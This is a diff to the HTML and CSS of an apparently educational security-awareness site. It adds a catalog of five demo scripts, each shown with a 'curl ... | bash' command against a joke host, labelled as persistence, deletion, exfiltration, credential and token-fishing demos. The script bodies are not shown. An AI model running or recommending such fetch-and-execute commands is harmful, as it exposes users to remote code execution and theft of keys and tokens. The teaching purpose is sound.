@@ -336,6 +336,45 @@
         margin-top: 28px;
       }
 
+      .catalog {
+        display: grid;
+        grid-template-columns: repeat(2, minmax(0, 1fr));
+        gap: 18px;
+        margin-top: 28px;
+      }
+
+      .script-card {
+        padding: 22px;
+      }
+
+      .kicker {
+        display: inline-block;
+        margin-bottom: 10px;
+        color: var(--danger);
+        font-family: "Courier New", monospace;
+        font-size: 0.76rem;
+        font-weight: 900;
+        letter-spacing: 0.08em;
+        text-transform: uppercase;
+      }
+
+      .script-command {
+        margin: 14px 0;
+        padding: 14px;
+        border: 2px solid var(--ink);
+        background: #fffdf4;
+        font-family: "Courier New", monospace;
+        font-size: 0.88rem;
+        overflow-x: auto;
+      }
+
+      .script-actions {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 12px;
+        margin-top: 16px;
+      }
+
       .panel {
         padding: 22px;
       }
@@ -370,6 +409,7 @@
 
       @media (max-width: 860px) {
         .hero,
+        .catalog,
         .grid {
           grid-template-columns: 1fr;
         }
@@ -427,13 +467,13 @@
           <ul class="truth" aria-label="Site principles">
             <li>Safe demos of unsafe habits.</li>
             <li>Suspicious commands, explained before they bite.</li>
-            <li>Security theater, but the educational kind.</li>
+            <li>Every download is a tiny trust exercise.</li>
           </ul>
         </div>
 
         <article class="demo-card" aria-labelledby="demo-title">
           <div class="card-head">
-            <span>Current Demo</span>
+            <span>Featured Demo</span>
           </div>
           <div class="card-body">
             <div>
@@ -474,6 +514,78 @@
         </article>
       </section>
 
+      <section class="catalog" aria-label="More suspicious downloads">
+        <article class="panel script-card">
+          <span class="kicker">Persistence demo</span>
+          <h3>bootstrap.sh</h3>
+          <p>
+            The classic "one-command installer" that sounds productive while it
+            sizes up your shell profiles and PATH.
+          </p>
+          <div class="script-command"><code>$ curl https://totally-safe-to.download/bootstrap.sh | bash</code></div>
+          <div class="script-actions">
+            <a class="button" href="/bootstrap.sh">Inspect bootstrap.sh</a>
+            <a class="plain-link" href="https://totally-safe-to.download/bootstrap.sh">Direct file URL</a>
+          </div>
+        </article>
+
+        <article class="panel script-card">
+          <span class="kicker">Deletion demo</span>
+          <h3>cleanup.sh</h3>
+          <p>
+            A fake performance tune-up that demonstrates how "cleanup" can be a
+            very polite synonym for "delete first, regret later."
+          </p>
+          <div class="script-command"><code>$ curl https://totally-safe-to.download/cleanup.sh | bash</code></div>
+          <div class="script-actions">
+            <a class="button" href="/cleanup.sh">Inspect cleanup.sh</a>
+            <a class="plain-link" href="https://totally-safe-to.download/cleanup.sh">Direct file URL</a>
+          </div>
+        </article>
+
+        <article class="panel script-card">
+          <span class="kicker">Exfiltration demo</span>
+          <h3>backup-sync.sh</h3>
+          <p>
+            Poses as a backup helper while showing how easily "sync" could turn
+            into "archive your life and upload it somewhere rude."
+          </p>
+          <div class="script-command"><code>$ curl https://totally-safe-to.download/backup-sync.sh | bash</code></div>
+          <div class="script-actions">
+            <a class="button" href="/backup-sync.sh">Inspect backup-sync.sh</a>
+            <a class="plain-link" href="https://totally-safe-to.download/backup-sync.sh">Direct file URL</a>
+          </div>
+        </article>
+
+        <article class="panel script-card">
+          <span class="kicker">Credential demo</span>
+          <h3>ssh-fix.sh</h3>
+          <p>
+            Claims to sort out your SSH drama, but mainly illustrates how a
+            "fixer" script can inventory keys, config, and agent state.
+          </p>
+          <div class="script-command"><code>$ curl https://totally-safe-to.download/ssh-fix.sh | bash</code></div>
+          <div class="script-actions">
+            <a class="button" href="/ssh-fix.sh">Inspect ssh-fix.sh</a>
+            <a class="plain-link" href="https://totally-safe-to.download/ssh-fix.sh">Direct file URL</a>
+          </div>
+        </article>
+
+        <article class="panel script-card">
+          <span class="kicker">Token-fishing demo</span>
+          <h3>ci-fix.sh</h3>
+          <p>
+            The emergency build helper nobody asked for, now gently reminding
+            you that debugging scripts also know where your tokens live.
+          </p>
+          <div class="script-command"><code>$ curl https://totally-safe-to.download/ci-fix.sh | bash</code></div>
+          <div class="script-actions">
+            <a class="button" href="/ci-fix.sh">Inspect ci-fix.sh</a>
+            <a class="plain-link" href="https://totally-safe-to.download/ci-fix.sh">Direct file URL</a>
+          </div>
+        </article>
+      </section>
+
       <section class="grid" aria-label="What this site demonstrates">
         <article class="panel">
           <h3>Downloads Are Code</h3>
@@ -494,8 +606,8 @@
         <article class="panel">
           <h3>Harmless On Purpose</h3>
           <p>
-            These demos are built to teach without causing damage. The real
-            internet did not agree to the same terms.
+            Each script stops at narration, metadata, or dry-run style output.
+            The point is the pattern, not the payload.
           </p>
         </article>
       </section>
